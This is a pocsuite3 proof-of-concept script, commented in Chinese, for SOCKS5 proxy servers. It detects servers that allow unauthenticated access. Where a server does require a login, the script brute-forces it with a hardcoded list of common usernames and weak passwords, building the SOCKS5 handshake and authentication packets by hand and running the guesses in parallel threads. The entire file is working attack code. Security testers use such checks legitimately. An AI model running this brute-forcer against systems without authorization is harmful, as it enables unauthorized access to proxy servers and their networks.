#!/usr/bin/env python
#coding=utf-8
import socket
#import traceback
import struct
# 多线程爆破 节省时间
from threading import Thread

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class Socks_unauth_POC(POCBase):
    vulID = 'Socks-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'Socks'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-27'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-27'  # 编写 PoC 的日期
    updateDate = '2020-04-27'  # PoC 更新的时间,默认和编写时间一样
    references = ['http://zhihan.me/network/2017/09/24/socks5-protocol/', 'https://www.jianshu.com/p/d03310004668']  # 漏洞地址来源,0day不用写
    name = 'Socks未授权访问漏洞'  # PoC 名称
    cvss = u"低危"


    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        host, port = url2ip(target_url, True)  

        # 包含了空用户名/空密码的情况。这时候任何用户名密码都可以登录成功
        usernames = ['admin', 'test', '']
        passwords = ['123456', 'admin', 'root', 'password', '123123', '123', '1', '',
                    'P@ssw0rd!!', 'qwa123', '12345678', 'test', '123qwe!@#',
                    '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000',
                    '1234567890', '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456',
                    '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd', 'p@55w0rd', 'password!',
                    'p@ssw0rd!', 'password1', 'r00t', 'system', '111111']
        try:

            self.flag = False  # 初始化
            self._username = ''
            self._password = ''
            
            threads = []

            for username in usernames:
                for password in passwords:
                    _thread = Thread(target=self.validate, args=(host, port, username, password))
                    _thread.start()
                    threads.append(_thread)
                    

            # 等待所有线程完成
            for t in threads:
                t.join()


            #flag = self.validate(host, port, "cqq", "cqq")
            #print(flag)

            if self.flag:
                print(self._username)
                print(self._password)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                return self.save_output(result)
            return self.save_output(result)
        except Exception as e:
            print(e)
        
        return self.save_output(result)


    #漏洞攻击
    def _attack(self):
        self._verify()


    def validate(self, host, port, username, password):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(5)
            s.connect((host,port))

            # socks5握手
            # 0x05 SOCKS5协议版本 
            # 0x02 支持的认证方法数量 
            # 0x00 免认证 
            # 0x02 账号密码认证
            payload1=b'\x05\x02\x00\x02'

            
            s.send(payload1)

            data1=s.recv(1024)
            #print(data1)

            
            # 需要认证  会返回\x05\x02
            # 不需要认证 会返回\x05\x00
            if data1[1] ==0:   # 表示不需要认证
                self.flag = True
                s.close()
                return True
            

            #payload = b'\x01\x03\x63\x71\x71\x04\x70\x61\x73\x72'
            #payload = b'\x01' + struct.pack('>H', len(user)) + user.encode() + struct.pack('>H', len(passwd)) + passwd.encode()
            user_len_b =  struct.pack('b', len(username))    # 使用b的时候，才是一个字节，否则使用>H 为两个字节
            user_b =      username.encode()
            
            pass_len_b =  struct.pack('b', len(password))
            pass_b =      password.encode()
            
            payload2 = b'\x01' + user_len_b +  user_b + pass_len_b + pass_b
            #print(payload2)

            
            # 发送socks5认证
            # 0x01 子协商版本
            # 0x03 用户名长度
            # 0x63 0x71 0x71 转换为ascii字符之后为"cqq"
            # 0x04 密码长度
            # 0x70 0x61 0x73 0x73 转换为ascii字符之后"pass"
            s.send(payload2)
            data2=s.recv(1024)
            #print(data2)

            if data2[1] ==0: #success
                print('Username:%s \tPassword:%s\nSuccess!'%(username,password))
                self._username = username
                self._password = password
                self.flag = True
                return
            else:
                print('Auth Fail!')
                p_flag=False
            s.close()
        except Exception as e:
            p_flag=False
            if s:
                s.close()


    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Socks_unauth_POC)
